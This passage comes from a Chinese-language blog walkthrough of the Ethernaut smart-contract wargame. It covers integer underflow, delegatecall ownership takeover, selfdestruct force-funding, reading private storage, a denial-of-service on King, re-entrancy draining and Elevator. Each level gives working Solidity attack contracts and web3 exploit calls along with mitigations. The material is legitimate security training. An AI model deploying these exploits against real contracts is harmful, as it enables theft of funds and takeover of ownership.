class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><p>整数溢出问题，<code>uint</code> 实际上是 <code>uint256</code>， 一个256位的无符号整数，即必然大于等于0。两个无符号整数相减，结果依然是无符号整数，<code>balances[msg.sender] - _value &gt;= 0</code>恒成立，可以向其他地址转账任意金额，也可以通过整数下溢使自己账户得到很大金额</p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204225829991.png" alt="image-20211204225829991"></p>
<p>溢出问题在solidity中很常见，为了避免这类问题可以使用以下语句进行检查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(a + c &gt; a) &#123;</span><br><span class="line">  a = a + c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以使用OpenZeppelin的SafeMath库，该库自动检查所有数学运算符中的溢出，如果出现溢出，代码将revert</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = a.add(c);</span><br></pre></td></tr></table></figure>



<h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>The goal of this level is for you to claim ownership of the instance you are given.</p>
<p> Things that might help</p>
<ul>
<li>Look into Solidity’s documentation on the <code>delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.</li>
<li>Fallback methods</li>
<li>Method ids</li>
</ul>
<h3 id="Sources-5"><a href="#Sources-5" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h3><p>目标是成为合约的<code>owner</code>，准确来说是成为<code>Delegation</code>合约的<code>owner</code>，对于<code>Delegate</code>而言，直接调用其<code>pwn()</code>函数即可，从<a href="https://github.dev/OpenZeppelin/ethernaut">Ethernaut靶场源码</a>也可以看到给出的关卡实例是<code>Delegation</code>合约</p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205151447286.png" alt="image-20211205151447286"></p>
<p>想获取<code>Delegate</code>地址可以用web3的<a href="https://learnblockchain.cn/docs/web3.js/web3-eth.html#getstorageat">getStorageAt</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">1</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(err,res)&#125;)</span><br></pre></td></tr></table></figure>



<p><a href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries">Delegatecall &#x2F; Callcode and Libraries</a></p>
<blockquote>
<p>There exists a special variant of a message call, named <strong>delegatecall</strong> which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and <code>msg.sender</code> and <code>msg.value</code> do not change their values.<br>This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.<br>This makes it possible to implement the “library” feature in Solidity: Reusable library code that can be applied to a contract’s storage, e.g. in order to implement a complex data structure.</p>
</blockquote>
<p>参考<a href="https://paper.seebug.org/633/">以太坊 Solidity 合约 call 函数簇滥用导致的安全风险</a>分析，使用<code>delegatecall</code>调用后内置变量<code>msg</code>的值不会修改为调用者，但执行环境为调用者的运行环境，也就是说在<code>Delegation</code>中执行<code>&lt;Delegate.address&gt;.delegatecall(bytes4(keccak256(&quot;pwn()&quot;)));</code>就可将<code>Delegation</code>的<code>owner</code>设为自己，注意这里并不是因为变量名都为<code>owner</code>所以可以修改，而是在两个合约中，<code>owner</code>都处于相同的槽位，详见<a href="https://zhuanlan.zhihu.com/p/55662982">Solidity的delegatecall()对状态变量存储的影响</a></p>
<p><code>fallback()</code>函数的触发条件：</p>
<ul>
<li>合约中没有相应的函数匹配（调用的函数不存在）</li>
<li>合约收到别人发送的Ether且没有数据，此时 <code>fallback()</code> 需要带有 <code>payable</code> 标记，否则revert</li>
</ul>
<p>综上，发送交易触发 <code>Delegation</code> 合约的 <code>fallback()</code> 函数，同时设置 <code>data</code> 为 <code>pwn</code> 函数的标识符即可（<code>data</code> 头4个byte是被调用方法的签名哈希，即 <code>bytes4(keccak256(&quot;func&quot;))</code> , remix 里调用函数，实际是向合约账户地址发送了<code>msg.data[0:4]</code> 为函数签名哈希的一笔交易）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">data</span>:web3.<span class="property">utils</span>.<span class="title function_">sha3</span>(<span class="string">&quot;pwn()&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205163154978.png" alt="image-20211205163154978"></p>
<p>使用web3：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Web3</span> = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> rpcURL = <span class="string">&#x27;***&#x27;</span> <span class="comment">// RPC URL</span></span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> <span class="title class_">Web3</span>(rpcURL)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Tx</span> = <span class="built_in">require</span>(<span class="string">&#x27;ethereumjs-tx&#x27;</span>).<span class="property">Transaction</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> contractAddress = <span class="string">&quot;0x78E07752555D94fFa95cC228E15627CA3804A3c8&quot;</span> <span class="comment">//合约地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> account = <span class="string">&#x27;0xdd7587F01659246E942148b70F2bCeD28aB8bC23&#x27;</span></span><br><span class="line"><span class="keyword">const</span> privateKey = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;***&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getTransactionCount</span>(account, <span class="function">(<span class="params">err, txCount</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> txObject = &#123;</span><br><span class="line">        <span class="attr">nonce</span>:    web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(txCount),</span><br><span class="line">        <span class="attr">gasLimit</span>: web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(<span class="number">8000000</span>),</span><br><span class="line">        <span class="attr">gasPrice</span>: web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>)),</span><br><span class="line">        <span class="attr">to</span>: contractAddress,</span><br><span class="line">        <span class="attr">data</span>: <span class="number">0xdd365b8b</span>, <span class="comment">//bytes4(keccak256(&quot;pwn()&quot;))</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> tx = <span class="keyword">new</span> <span class="title class_">Tx</span>(txObject,&#123; <span class="attr">chain</span>: <span class="string">&#x27;rinkeby&#x27;</span> &#125;)</span><br><span class="line">    tx.<span class="title function_">sign</span>(privateKey)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> serializedTx = tx.<span class="title function_">serialize</span>()</span><br><span class="line">    <span class="keyword">const</span> raw = <span class="string">&#x27;0x&#x27;</span> + serializedTx.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    web3.<span class="property">eth</span>.<span class="title function_">sendSignedTransaction</span>(raw, <span class="function">(<span class="params">err, txHash</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;err:&#x27;</span>, err)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;txHash:&#x27;</span>, txHash)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>一个实际案例<a href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/">The Parity Wallet Hack Explained</a></p>
<h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>Some contracts will simply not take your money <code>¯\_(ツ)_/¯</code></p>
<p>The goal of this level is to make the balance of the contract greater than zero.</p>
<p> Things that might help:</p>
<ul>
<li>Fallback methods</li>
<li>Sometimes the best way to attack a contract is with another contract.</li>
<li>See the Help page above, section “Beyond the console”</li>
</ul>
<h3 id="Sources-6"><a href="#Sources-6" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h3><p>需要让合约的balance大于0。尝试直接向合约转账的话会被revert（没有<code>receive()</code>也没有<code>payable</code>修饰的<code>fallback()</code>函数）</p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205134428192.png" alt="image-20211205134428192"></p>
<p>不过可以通过<code>selfdestruct</code>强行转账</p>
<blockquote>
<p><code>selfdestruct(address payable recipient)</code>: destroy the current contract, sending its funds to the given address</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract ForceAttack &#123;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;&#125;</span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function attack(address payable target) public &#123;</span><br><span class="line">    selfdestruct(target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205140506104.png" alt="image-20211205140506104"></p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205140250560.png" alt="image-20211205140250560"></p>
<h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p>Unlock the vault to pass the level!</p>
<h3 id="Sources-7"><a href="#Sources-7" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) public &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution"></a>Solution</h3><p><code>password</code>被设置为private，无法被其他合约直接访问，但是区块链上的所有信息是公开的，可以借助web3的<a href="https://learnblockchain.cn/docs/web3.js/web3-eth.html#getstorageat">getStorageAt</a>来访问</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">1</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(err,web3.<span class="property">utils</span>.<span class="title function_">toAscii</span>(res))&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205143345839.png" alt="image-20211205143345839"></p>
<p>密码是<code>A very strong secret password :)</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(web3.<span class="property">utils</span>.<span class="title function_">asciiToHex</span>(<span class="string">&quot;A very strong secret password :)&quot;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205144246292.png" alt="image-20211205144246292"></p>
<p>为了确保数据是私有的，需要在将其放入区块链之前对其进行加密。在这种情况下，解密密钥永远不应该在链上发送，因为它将对任何寻找它的人可见。<a href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/">zk-SNARKs</a>提供了一种无需公开参数确定某人是否拥有秘密参数的方法</p>
<h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><p>The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD</p>
<p>Such a fun game. Your goal is to break it.</p>
<p>When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.</p>
<h3 id="Sources-8"><a href="#Sources-8" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h3><p>转账金额大于当前<code>prize</code>即可成为<code>king</code>，然而如下<a href="https://github.dev/OpenZeppelin/ethernaut">代码</a>可知，提交<code>instance</code>时，题目作为<code>owner</code>会重新夺回<code>king</code>，通关条件是阻止题目重新成为<code>king</code></p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205214625649.png" alt="image-20211205214625649"></p>
<p>Solidity的三种转账方式：</p>
<ul>
<li><p><code>&lt;address payable&gt;.transfer(uint256 amount)</code></p>
<p>当发送失败时会 <code>throw</code> ，回滚状态</p>
<p>只会传递部分  <code>Gas</code>  供调用，防止重入</p>
</li>
<li><p><code>&lt;address payable&gt;.send(uint256 amount) returns (bool)</code></p>
<p>当发送失败时会返回 <code>false</code><br>只会传递部分 <code>Gas</code> 供调用，防止重入</p>
</li>
<li><p><code>&lt;address payable&gt;.call.value()()</code></p>
<p>当发送失败时会返回 <code>false</code><br>传递所有可用 <code>Gas</code> 供调用，不能有效防止重入</p>
</li>
</ul>
<p>题目通过<code>king.transfer(msg.value);</code>向之前的<code>king</code>转账，<code>transfer</code>这种方式失败会<code>throws</code> 错误，无法继续执行下面的代码，所以只要让转账时出错，就不会产生新的<code>king</code>。另外我们知道，如果向一个没有 <code>fallback</code> 函数的合约，或 <code>fallback</code> 不带 <code>payable</code> 的合约发送 <code>Ether</code>，则会报错。</p>
<p>先看一下当前的<code>prize</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">fromWei</span>((<span class="keyword">await</span> contract.<span class="title function_">prize</span>()))</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205222034688.png" alt="image-20211205222034688"></p>
<p>部署以下合约，调用<code>doYourThing</code>函数，传入实例地址和1.001 Ether</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract KingAttack &#123;</span><br><span class="line"></span><br><span class="line">  function doYourThing(address _target) public payable &#123;</span><br><span class="line">     (bool result,) = _target.call.value(msg.value)(&quot;&quot;);</span><br><span class="line">     if(!result) revert();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // OMG NO PAYABLE FALLBACK!!</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205224256248.png" alt="image-20211205224256248"></p>
<p>可以看到<code>king</code>已经变成了刚部署的合约的地址</p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205224553899.png" alt="image-20211205224553899"></p>
<p>提交实例后，<code>king</code>依然不变</p>
<h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><p>The goal of this level is for you to steal all the funds from the contract.</p>
<p> Things that might help:</p>
<ul>
<li>Untrusted contracts can execute code where you least expect it.</li>
<li>Fallback methods</li>
<li>Throw&#x2F;revert bubbling</li>
<li>Sometimes the best way to attack a contract is with another contract.</li>
<li>See the Help page above, section “Beyond the console”</li>
</ul>
<h3 id="Sources-9"><a href="#Sources-9" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution"></a>Solution</h3><p>代码中使用的这种方式转账<code>msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</code>会传递所有可用 Gas 进行调用，从而造成重入漏洞。</p>
<p>拿上面的代码简单解释一下重入漏洞就是如果调用<code>withdraw</code>函数向一个合约转账，合约接收Ether会调用<code>receive</code>函数（或者<code>fallback</code>），那么只要在<code>receive</code>中再次调用<code>withdraw</code>，那么合约会再次进行转账并且不会执行到<code>msg.sender.call&#123;value:_amount&#125;(&quot;&quot;)</code>下方更改账户余额的语句<code>balances[msg.sender] -= _amount</code>，图示如下：</p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/6.png" alt="img"></p>
<p>部署以下<code>ReentranceAttack</code>合约（部署时传入1Ether）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.6.2;</span><br><span class="line"></span><br><span class="line">abstract contract Reentrance &#123;</span><br><span class="line">  function donate(address _to) virtual public payable ;</span><br><span class="line">  function withdraw(uint _amount) virtual public ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReentranceAttack &#123;</span><br><span class="line">  address payable owner;</span><br><span class="line">  Reentrance target;</span><br><span class="line"></span><br><span class="line">  constructor(address payable _target) public payable &#123;</span><br><span class="line">    target = Reentrance(_target);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack() public &#123;</span><br><span class="line">    target.donate&#123;value:1 ether&#125;(address(this));</span><br><span class="line">    target.withdraw(1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    target.withdraw(1 ether);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211209085431565.png" alt="image-20211209085431565"></p>
<p>然后调用<code>attack</code>函数，注意<code>GAS </code>要设置大一点，否则重入时会调用失败</p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211208235728789.png" alt="image-20211208235728789"></p>
<p>为了防止重入漏洞，最好采用<a href="https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern">Checks-Effects-Interactions</a>模式，即先检查，然后更改合约状态变量，最后才与其他合约交互。</p>
<h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>This elevator won’t let you reach the top of your building. Right?</p>
<p> Things that might help:</p>
<ul>
<li>Sometimes solidity is not good at keeping promises.</li>
<li>This <code>Elevator</code> expects to be used from a <code>Building</code>.</li>
</ul>
<h3 id="Sources-10"><a href="#Sources-10" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution"></a>Solution</h3><p>要求是使<code>top</code>为<code>true</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.2;</span><br><span class="line"></span><br><span class="line">abstract contract Elevator &#123;</span><br><span class="line">  function goTo(uint _floor) virtual public;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ElevatorAttack is Building&#123;</span><br><span class="line">  bool public isLast = true;</span><br><span class="line">  </span><br><span class="line">  function isLastFloor(uint) override external returns (bool) &#123;</span><br><span class="line">    isLast = ! isLast;</span><br><span class="line">    return isLast;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack(address _victim) public &#123;</span><br><span class="line">    Elevator elevator = Elevator(_victim);</span><br><span class="line">    elevator.goTo(10);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目原来是<code>function isLastFloor(uint) view public returns (bool);</code>考点是<code>Solidity</code> 编译器没有强制执行 <code>view</code> 函数不能修改状态</p>
<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>The creator of this contract was careful enough to protect the sensitive areas of its storage.</p>
<p>Unlock this contract to beat the level.</p>
<p>Things that might help:</p>
<ul>
<li>Understanding how storage works</li>
<li>Understanding how parameter parsing works</li>
<li>Understanding how casting works</li>
</ul>
<p>Tips:</p>
<ul>
<li>Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.</li>
</ul>
<h3 id="Sources-11"><a href="#Sources-11" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = true;</span><br><span class="line">  uint256 public ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = 10;</span><br><span class="line">  uint8 private denomination = 255;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) public &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key == bytes16(data[2]));</span><br><span class="line">    locked = false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      